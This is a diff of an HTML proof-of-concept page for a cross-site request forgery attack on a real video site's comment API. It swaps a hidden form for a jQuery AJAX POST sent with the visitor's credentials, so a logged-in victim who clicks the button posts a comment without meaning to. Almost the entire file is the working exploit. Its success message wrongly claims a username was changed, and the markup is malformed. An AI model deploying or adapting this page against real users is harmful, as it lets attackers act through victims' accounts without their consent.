@@ -1,8 +1,34 @@
 <!DOCTYPE html>
 <html>
+<body>
 <head>
- <form action="https://www.magisto.com/api/video/comments/P14CZgkQE20vQg5hCzE" method="POST">
-      <input type="hidden" name="comment" value="right on csrf" />
-      <input type="submit" value="Submit request" />
-    </form>
+ <script src=/jquery-3.4.1.min.js></script>
+</head>
+<title>CSRF FOR COMMENT</title>
+ <script>
+	function csrf(){
+		var data = "comment=csrf for test";
+		$.ajax({
+			    url : 'https://www.magisto.com/api/video/comments/P14CZgkQE20vQg5hCzE',
+			    type : 'POST',
+			    data:data,
+			    xhrFields: {
+			     withCredentials: true
+			 },
+			    success : function(response, textStatus, jqXhr) {
+				alert("Successfully !Your account's loggin userName have been modified!");
+			    },
+			    error : function(jqXHR, textStatus, errorThrown) {
+				// log the error to the console
+				console.log("The following error occured: " + textStatus, errorThrown);
+			    },
+			    complete : function() {
+				console.log("complete");
+			    }
+        });
+	}
+ </script>
+ click the button to csrf comment!
+<button id="csrf" onclick="csrf()">csrf for comment</button>
+</body>
 </html>
